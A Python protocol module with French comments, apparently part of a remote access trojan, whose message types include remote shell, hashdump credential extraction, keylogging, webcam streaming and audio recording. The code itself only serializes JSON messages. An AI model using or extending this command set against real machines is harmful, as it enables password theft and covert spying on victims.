"""Protocole de communication entre le serveur et le client.

Définit les types de messages et les formats d'échange.
"""

import json
import logging
from enum import Enum
from typing import Any, Dict

logger = logging.getLogger(__name__)


class MessageType(Enum):
    """Types de messages échangés entre client et serveur."""

    # Commandes
    CMD_HELP = "help"
    CMD_DOWNLOAD = "download"
    CMD_UPLOAD = "upload"
    CMD_SHELL = "shell"
    CMD_IPCONFIG = "ipconfig"
    CMD_SCREENSHOT = "screenshot"
    CMD_SEARCH = "search"
    CMD_HASHDUMP = "hashdump"
    CMD_KEYLOGGER_START = "keylogger_start"
    CMD_KEYLOGGER_STOP = "keylogger_stop"
    CMD_KEYLOGGER_GET = "keylogger_get"
    CMD_WEBCAM_SNAPSHOT = "webcam_snapshot"
    CMD_WEBCAM_STREAM_START = "webcam_stream_start"
    CMD_WEBCAM_STREAM_STOP = "webcam_stream_stop"
    CMD_RECORD_AUDIO_START = "record_audio_start"
    CMD_RECORD_AUDIO_STOP = "record_audio_stop"

    # Réponses
    RESP_OK = "ok"
    RESP_ERROR = "error"
    RESP_DATA = "data"
    RESP_FILE = "file"
    RESP_SHELL_OUTPUT = "shell_output"
    RESP_SHELL_END = "shell_end"
    RESP_KEYSTROKE = "keystroke"
    RESP_STREAM_FRAME = "stream_frame"
    RESP_AUDIO_CHUNK = "audio_chunk"


class Message:
    """Représente un message échangé entre client et serveur."""

    def __init__(self, msg_type: MessageType, **kwargs):
        self.type = msg_type
        self.payload = kwargs

    def to_bytes(self) -> bytes:
        """Convertit le message en bytes pour l'envoi."""
        data = {"type": self.type.value, "payload": self.payload}
        return json.dumps(data).encode("utf-8")

    @classmethod
    def from_bytes(cls, data: bytes) -> "Message":
        """Crée un message à partir de bytes reçus."""
        obj = json.loads(data.decode("utf-8"))
        msg_type = MessageType(obj["type"])
        return cls(msg_type, **obj.get("payload", {}))

    def __repr__(self) -> str:
        return f"Message(type={self.type.value}, payload={self.payload})"